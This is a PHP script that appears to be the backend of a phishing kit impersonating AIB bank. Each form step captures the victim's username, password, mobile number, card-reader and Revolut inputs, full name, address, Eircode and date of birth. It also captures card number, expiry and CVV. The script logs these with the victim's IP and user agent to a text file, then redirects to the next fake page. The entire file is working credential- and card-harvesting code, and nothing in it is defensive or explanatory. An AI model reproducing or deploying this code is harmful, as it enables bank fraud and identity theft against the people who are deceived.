<?php

if (isset($_POST['btn0'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
header('Location: ./Login.html');


	
	

	
}

if (isset($_POST['btn1'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[AIB]====================
Username    : " . $_POST['username'] . "
Password    : " . $_POST['password'] . "
Mobile      : " . $_POST['mobile'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]==================== \n", FILE_APPEND);
header('Location: ./Select.html');


	
	

	
}
if (isset($_POST['btn2'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();

file_put_contents("usernames.txt", 
"===================[AIB]====================
Cardreader   : " . $_POST['cardreader'] . "
Revolut      : " . $_POST['revolut'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]==================== \n", FILE_APPEND);
header('Location: ./Processing.html');


	
	

	
}
else if (isset($_POST['btn3'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[AIB]==================
Full Name   : " . $_POST['fullname'] . "
Address     : " . $_POST['address'] . "
Eircode     : " . $_POST['eircode'] . "
Dob         : " . $_POST['dob'] . "
Mobile      : " . $_POST['mobile'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]================== \n", FILE_APPEND);
header('Location: ./Card.html');
	
	
	

	
}
else if (isset($_POST['btn4'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[AIB]==================
Card Number : " . $_POST['ccnum'] . "
Expire Date : " . $_POST['ccexp'] . "
CVV         : " . $_POST['cccvv'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]================== \n", FILE_APPEND);
header('Location: ./SelectService.html');
	

	
}
if (isset($_POST['btn5'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();

file_put_contents("usernames.txt", 
"===================[AIB]====================
Opt-In      : " . $_POST['optin'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]==================== \n", FILE_APPEND);
header('Location: ./Finish.html');


	
	

	
}


?>